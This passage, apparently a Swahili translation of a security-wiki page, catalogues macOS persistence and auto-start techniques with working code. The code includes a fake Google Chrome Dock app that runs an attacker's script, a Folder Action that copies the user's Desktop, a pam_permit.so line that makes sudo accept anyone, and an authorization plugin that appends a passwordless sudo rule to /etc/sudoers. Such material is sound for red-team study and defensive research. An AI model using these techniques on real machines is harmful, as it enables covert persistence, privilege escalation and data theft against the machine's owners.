Ukihifadhi faili ya **ZIP** kama **Login Item**, **`Archive Utility`** itaifungua, na ikiwa zip hiyo, kwa mfano, ilihifadhiwa kwenye **`~/Library`** na ilikuwa na Folder **`LaunchAgents/file.plist`** yenye backdoor, folder hiyo itaundwa (haipo kwa default) na plist itaongezwa. Kwa hiyo, mtumiaji atakapo-login tena, **backdoor iliyoonyeshwa kwenye plist itatekelezwa**.

Chaguo jingine litakuwa kuunda faili **`.bash_profile`** na **`.zshenv`** ndani ya HOME ya mtumiaji, hivyo ikiwa folder ya LaunchAgents tayari ipo, technique hii bado itafanya kazi.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Ni muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji **kutekeleza** **`at`** na lazima iwe **enabled**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Unahitaji **kutekeleza** **`at`** na lazima iwe **enabled**

#### **Maelezo**

Tasks za `at` zimeundwa kwa ajili ya **kupanga tasks za mara moja** zitakazotekelezwa wakati maalum. Tofauti na cron jobs, tasks za `at` huondolewa kiotomatiki baada ya kutekelezwa. Ni muhimu kutambua kwamba tasks hizi hudumu hata baada ya system reboot, jambo linalozifanya kuwa security concerns zinazowezekana chini ya hali fulani.<sup>[16]</sup>

Kwa **default**, huwa **disabled**, lakini mtumiaji wa **root** anaweza **kuzienable** kwa kutumia:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Hii itaunda faili baada ya saa 1:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Kagua foleni ya kazi kwa kutumia `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Hapo juu tunaweza kuona kazi mbili zilizopangwa. Tunaweza kuchapisha maelezo ya kazi kwa kutumia `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Ikiwa AT tasks hazijawezeshwa, tasks zilizoundwa hazitatekelezwa.

**Faili za job** zinapatikana kwenye `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Jina la faili lina queue, nambari ya job, na muda ambao imepangwa kuendeshwa. Kwa mfano, tuchunguze `a0001a019bdcd2`.

- `a` - hii ndiyo queue
- `0001a` - nambari ya job katika hex, `0x1a = 26`
- `019bdcd2` - muda katika hex. Inawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika decimal. Tukizidisha kwa 60 tunapata `1619509560`, ambayo ni `GMT: 2021. Aprili 27., Jumanne 7:46:00`.

Tukichapisha job file, tunapata kwamba ina taarifa zilezile tulizopata kwa kutumia `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kuweza kuita `osascript` ikiwa na arguments ili kuwasiliana na **`System Events`** na kuweza kusanidi Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ina baadhi ya ruhusa za msingi za TCC kama Desktop, Documents na Downloads

#### Mahali

- **`/Library/Scripts/Folder Action Scripts`**
- Root inahitajika
- **Trigger**: Kufikiwa kwa folder iliyobainishwa
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Kufikiwa kwa folder iliyobainishwa

#### Maelezo na Exploitation

Folder Actions ni scripts zinazoanzishwa kiotomatiki na mabadiliko katika folder, kama vile kuongeza au kuondoa items, au actions nyingine kama kufungua au kubadilisha ukubwa wa dirisha la folder. Actions hizi zinaweza kutumiwa kwa kazi mbalimbali, na zinaweza kuanzishwa kwa njia tofauti kama kutumia Finder UI au terminal commands.<sup>[17][18]</sup>

Ili kusanidi Folder Actions, una chaguo kama:

1. Kutengeneza Folder Action workflow kwa [Automator](https://support.apple.com/guide/automator/welcome/mac) na kuisakinisha kama service.
2. Kuambatisha script manually kupitia Folder Actions Setup katika context menu ya folder.
3. Kutumia OSAScript kutuma Apple Event messages kwa `System Events.app` ili kusanidi Folder Action programmatically.
- Njia hii ni muhimu hasa kwa kuingiza action hiyo katika mfumo, na kutoa kiwango fulani cha persistence.

Script ifuatayo ni mfano wa kile kinachoweza kutekelezwa na Folder Action:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Ili kufanya script iliyo hapo juu itumike na Folder Actions, i-compile kwa kutumia:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Baada ya script ku-compile, weka Folder Actions kwa kutekeleza script iliyo hapa chini. Script hii itawezesha Folder Actions kwa ujumla na kuambatisha script iliyokuwa ime-compile kwenye folda ya Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Endesha setup script kwa:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Hivi ndivyo unavyotekeleza persistence hii kupitia GUI:

Hii ndiyo script itakayoendeshwa:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
I-compile kwa kutumia: `osacompile -l JavaScript -o folder.scpt source.js`

Ihamishe hadi:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Kisha, fungua app ya `Folder Actions Setup`, chagua **folda unayotaka kufuatilia** na katika hali yako chagua **`folder.scpt`** (kwangu niliiita output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Sasa, ukifungua folda hiyo kwa **Finder**, script yako itatekelezwa.

Usanidi huu ulihifadhiwa katika **plist** iliyoko **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** katika muundo wa base64.

Sasa, tujaribu kuandaa persistence hii bila ufikiaji wa GUI:

1. **Nakili `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwenda `/tmp` ili kuunda backup yake:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Ondoa** Folder Actions uliyoweka hivi punde:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Sasa kwa kuwa tuna mazingira matupu

3. Nakili faili ya backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Fungua Folder Actions Setup.app ili kutumia config hii: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Na hii haikunifanyia kazi, lakini hayo ndiyo maelekezo kutoka kwenye writeup:(

### Njia za mkato za Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Ni muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kuwa umesakinisha application hasidi ndani ya mfumo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Mtumiaji anapobofya app iliyo ndani ya Dock

#### Maelezo na Exploitation

Application zote zinazoonekana kwenye Dock zimeainishwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[19]</sup>

Inawezekana **kuongeza application** kwa kutumia tu:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Kwa kutumia **social engineering** unaweza **kujifanya kwa mfano Google Chrome** ndani ya dock na kutekeleza script yako mwenyewe:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Vichagua Rangi

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Kitendo maalum sana kinahitaji kutokea
- Utaishia kwenye sandbox nyingine
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/Library/ColorPickers`
- Root inahitajika
- Trigger: Tumia color picker
- `~/Library/ColorPickers`
- Trigger: Tumia color picker

#### Maelezo na Exploit

**Compile bundle ya color picker** yenye code yako (unaweza kutumia [**hii kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na uongeze constructor (kama ilivyo katika [sehemu ya Screen Saver](macos-auto-start-locations.md#screen-saver)), kisha nakili bundle hiyo kwenye `~/Library/ColorPickers`.<sup>[20]</sup>

Kisha color picker inapo-triggeriwa, code yako inapaswa pia kutekelezwa.

Kumbuka kwamba binary inayopakia library yako ina **sandbox yenye vizuizi vikali sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Useful to bypass sandbox: **Hapana, kwa sababu unahitaji kuendesha app yako mwenyewe**
- TCC bypass: ???

#### Location

- App maalum

#### Description & Exploit

Mfano wa application yenye Finder Sync Extension [**unaweza kuupata hapa**](https://github.com/D00MFist/InSync).

Applications zinaweza kuwa na `Finder Sync Extensions`. Extension hii itawekwa ndani ya application itakayoendeshwa. Zaidi ya hayo, ili extension iweze kutekeleza code yake, **lazima isainiwe** kwa valid Apple developer certificate, lazima iwe **sandboxed** (ingawa relaxed exceptions zinaweza kuongezwa), na lazima isajiliwe kwa kitu kama:<sup>[21][22]</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Maelezo: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Maelezo: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Inafaa kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini utaishia kwenye application sandbox ya kawaida
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/System/Library/Screen Savers`
- Root inahitajika
- **Trigger**: Chagua screen saver
- `/Library/Screen Savers`
- Root inahitajika
- **Trigger**: Chagua screen saver
- `~/Library/Screen Savers`
- **Trigger**: Chagua screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Maelezo na Exploit

Unda project mpya katika Xcode na uchague template ya kutengeneza **Screen Saver** mpya. Kisha, ongeza code yako, kwa mfano code ifuatayo ya kutengeneza logs.<sup>[23][24]</sup>

**Build** it, na unakili bundle ya `.saver` kwenye **`~/Library/Screen Savers`**. Kisha, fungua Screen Saver GUI na ukibofya tu juu yake, inapaswa kutengeneza logs nyingi:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Kumbuka kwamba kwa kuwa ndani ya entitlements za binary inayopakia code hii (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`**, utakuwa **ndani ya common application sandbox**.

Code ya Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini utaishia kwenye application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox inaonekana kuwa na mipaka mikubwa

#### Mahali

- `~/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayosimamiwa na spotlight plugin inaundwa.
- `/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayosimamiwa na spotlight plugin inaundwa.
- Root inahitajika
- `/System/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayosimamiwa na spotlight plugin inaundwa.
- Root inahitajika
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Faili mpya yenye extension inayosimamiwa na spotlight plugin inaundwa.
- App mpya inahitajika

#### Maelezo na Exploitation

Spotlight ni kipengele cha utafutaji kilichojengwa ndani ya macOS, kilichoundwa kuwapa watumiaji **ufikiaji wa haraka na wa kina wa data iliyo kwenye kompyuta zao**.\
Ili kuwezesha uwezo huu wa utafutaji wa haraka, Spotlight hudumisha **database ya proprietary** na huunda index kwa **kupitia faili nyingi**, hivyo kuwezesha utafutaji wa haraka kupitia majina ya faili pamoja na maudhui yake.<sup>[25]</sup>

Mfumo wa msingi wa Spotlight unahusisha process kuu inayoitwa 'mds', ambayo inasimamia **'metadata server'.** Process hii huratibu huduma nzima ya Spotlight. Pamoja nayo, kuna daemons nyingi za 'mdworker' zinazotekeleza kazi mbalimbali za maintenance, kama vile ku-index aina tofauti za faili (`ps -ef | grep mdworker`). Kazi hizi zinawezeshwa na Spotlight importer plugins, au **".mdimporter bundles**", ambazo huwezesha Spotlight kuelewa na ku-index maudhui katika aina mbalimbali za file formats.

Plugins au **`.mdimporter`** bundles ziko katika maeneo yaliyotajwa hapo awali, na bundle mpya inapojitokeza hupakiwa ndani ya dakika moja (hakuna haja ya ku-restart service yoyote). Bundles hizi zinahitaji kuonyesha ni **aina gani ya faili na extensions gani zinaweza kusimamia**, ili Spotlight itumie zinapoundwa faili mpya yenye extension iliyoonyeshwa.

Inawezekana **kupata `mdimporters`** zote zilizopakiwa kwa kuendesha:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** hutumiwa kuchanganua aina hizi za faili (miongoni mwa nyingine, viendelezi `.iba` na `.book`):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Ukikagua Plist ya `mdimporter` nyingine huenda usipate entry **`UTTypeConformsTo`**. Hiyo ni kwa sababu ni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) iliyojengewa ndani na haihitaji kubainisha extensions.
>
> Zaidi ya hayo, plugins za msingi za System huwa na kipaumbele, kwa hiyo attacker anaweza kufikia tu files ambazo hazija-indexiwa vinginevyo na `mdimporters` za Apple.
>
> Ili kuunda importer yako mwenyewe unaweza kuanzia kwenye project hii: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), kisha ubadilishe jina, **`CFBundleDocumentTypes`** na uongeze **`UTImportedTypeDeclarations`** ili iunge mkono extension unayotaka kuunga mkono, na uzireflect kwenye **`schema.xml`**.\
> Kisha **badilisha** code ya function **`GetMetadataForFile`** ili itekeleze payload yako wakati file yenye extension iliyochakatwa inapoundwa.
>
> Hatimaye **build na copy `.mdimporter`** yako mpya kwenye mojawapo ya locations tatu zilizotangulia, na unaweza kuangalia wakati inapoload kwa **monitoring the logs** au kukagua **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Haionekani kama hii bado inafanya kazi.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Inafaa kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Inahitaji user action maalum
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Haionekani kama hii bado inafanya kazi.<sup>[26]</sup>

## Root Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata start locations zinazofaa kwa **sandbox bypass**, zinazokuruhusu kutekeleza kitu kwa urahisi kwa **kukiiandika kwenye file** ukiwa **root** na/au zikihitaji **conditions nyingine zisizo za kawaida.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Inafaa kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root inahitajika
- **Trigger**: Wakati muda unapofika
- `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local`
- Root inahitajika
- **Trigger**: Wakati muda unapofika

#### Description & Exploitation

Scripts za periodic (**`/etc/periodic`**) hutekelezwa kwa sababu ya **launch daemons** zilizosanidiwa kwenye `/System/Library/LaunchDaemons/com.apple.periodic*`. Kumbuka kwamba scripts zilizohifadhiwa kwenye `/etc/periodic/` **hutekelezwa** kama **owner wa file,** kwa hiyo hii haitafanya kazi kwa potential privilege escalation.<sup>[27]</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Kuna scripts nyingine za periodic ambazo zitatekelezwa, zilizoonyeshwa katika **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Ukiweza kuandika faili yoyote kati ya `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local` ita-**executed sooner or later**.

> [!WARNING]
> Kumbuka kwamba periodic script ita-**executed as the owner of the script**. Kwa hiyo, ikiwa mtumiaji wa kawaida ndiye anayemiliki script, ita-**executed as that user** (hii inaweza kuzuia privilege escalation attacks).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Muhimu kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Root inahitajika kila wakati

#### Maelezo na Exploitation

Kwa kuwa PAM inalenga zaidi **persistence** na malware kuliko easy execution ndani ya macOS, blogu hii haitatoa maelezo ya kina, **soma writeups ili kuelewa technique hii vizuri**.<sup>[28]</sup>

Kagua PAM modules kwa kutumia:
```bash
ls -l /etc/pam.d
```
Mbinu ya persistence/privilege escalation inayotumia PAM vibaya ni rahisi kama kurekebisha module /etc/pam.d/sudo na kuongeza mwanzoni mstari:
```bash
auth       sufficient     pam_permit.so
```
Kwa hiyo itaonekana **kama** kitu kama hiki:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Na kwa hivyo jaribio lolote la kutumia **`sudo` litafanya kazi**.

> [!CAUTION]
> Kumbuka kwamba saraka hii inalindwa na TCC, kwa hivyo kuna uwezekano mkubwa kwamba mtumiaji ataonyeshwa ombi la kutoa ufikiaji.

Mfano mwingine mzuri ni su, ambapo unaweza kuona kwamba pia inawezekana kutoa vigezo kwa moduli za PAM (na unaweza pia kuweka backdoor kwenye faili hii):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Andiko: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Andiko: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Inasaidia kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root na kufanya configs za ziada
- TCC bypass: ???

#### Mahali

- `/Library/Security/SecurityAgentPlugins/`
- Root inahitajika
- Pia inahitajika kusanidi authorization database ili itumie plugin

#### Maelezo na Exploitation

Unaweza kuunda authorization plugin ambayo itatekelezwa user anapoingia ili kudumisha persistence. Kwa maelezo zaidi kuhusu jinsi ya kuunda mojawapo ya plugins hizi, angalia maandiko yaliyotangulia (na uwe mwangalifu, plugin iliyoandikwa vibaya inaweza kukufungia nje, na utahitaji kusafisha Mac yako kutoka recovery mode).<sup>[29][30]</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Hamisha** bundle hadi eneo itakapopakiwa:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Hatimaye ongeza **rule** ya kupakia Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** itaarifu authorization framework kwamba itahitaji **kuita external mechanism kwa ajili ya authorization**. Zaidi ya hayo, **`privileged`** itasababisha itekelezwe na root.

Ianzishe kwa:
```bash
security authorize com.asdf.asdf
```
